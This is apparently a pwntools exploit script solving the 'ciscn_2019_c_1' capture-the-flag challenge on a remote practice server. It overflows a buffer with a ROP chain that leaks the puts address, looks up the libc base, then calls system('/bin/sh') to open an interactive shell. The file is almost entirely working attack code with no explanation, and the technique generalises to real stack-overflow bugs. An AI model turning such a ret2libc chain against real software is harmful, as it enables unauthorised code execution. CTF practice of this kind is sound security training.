from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
elf = ELF('./ciscn_2019_c_1')
sh = process('./ciscn_2019_c_1')
sh = remote('node3.buuoj.cn', 25720)

main = 0x400B28
pop_rdi = 0x400c83
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
ret = 0x4006b9


sh.recvuntil("Input your choice!")
payload_01 = 'A' * 0x50 + p64(0xdeedbeef) + p64(pop_rdi)
payload_01 += p64(puts_got)
payload_01 += p64(puts_plt)
payload_01 += p64(main)


sh.recv()
sh.sendline('1')
sh.recv()
sh.sendline(payload_01)
sh.recvline()
sh.recvline()
sh.recvline()


libc_puts = u64(sh.recvline()[0:6] + '\x00' + '\x00')
print 'libc_puts: ' + hex(libc_puts)
libc = LibcSearcher('puts', libc_puts)
libc_base = libc_puts - libc.dump('puts')
libc_sh = libc_base + libc.dump('str_bin_sh')
libc_t = libc_base + libc.dump('puts')
libc_sys = libc_base + libc.dump('system')

print '-----------------------------'
print 'libc_base: ' + hex(libc_base) 

sh.recvuntil("Input your choice!")
sh.sendline('1')
#ret ---> rsp <-> rbp
payload_02 = 'A' * 0x50 + p64(0xdeedbeef) + p64(ret) + p64(pop_rdi)
payload_02 += p64(libc_sh)
payload_02 += p64(libc_sys)

#gdb.attach(sh)
sh.sendline(payload_02)

sh.interactive()
